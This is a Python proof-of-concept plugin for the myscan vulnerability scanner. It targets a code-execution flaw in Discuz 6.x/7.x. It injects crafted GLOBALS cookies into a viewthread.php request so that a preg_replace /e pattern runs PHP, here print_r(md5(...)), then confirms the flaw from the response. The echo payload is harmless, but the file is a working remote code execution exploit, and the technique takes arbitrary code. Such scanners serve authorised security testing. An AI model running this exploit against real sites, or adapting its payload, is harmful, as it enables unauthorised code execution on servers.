#!/usr/bin/env python3
# @Time    : 2020-04-08
# @Author  : caicai
# @File    : poc_discuz-wooyun-2010-080723_2010.py


from myscan.lib.core.common import getmd5, get_random_num
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "discuz-wooyun-2010-080723"
        self.vulmsg = "Discuz 7.x/6.x 全局变量防御绕过导致代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        num=get_random_num(4)
        num_md5=getmd5(num)
        req = {
            "method": "GET",
            "url": self.url + "viewthread.php?tid=10",
            # "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "cookies":{"GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D":"/.*/eui", "GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D":"print_r(md5({}))".format(num)},
            "timeout": 10,
            "verify": False,
        }
        r = request(**req)
        if r != None and r.status_code == 200 and num_md5[10:20].encode() in r.content :
            parser_ = response_parser(r)
            self.result.append({
                "name": self.name,
                "url": parser_.geturl(),
                "level": self.level,  # 0:Low  1:Medium 2:High
                "detail": {
                    "vulmsg": self.vulmsg,
                    "request": parser_.getrequestraw(),
                    "response": parser_.getresponseraw()
                }
            })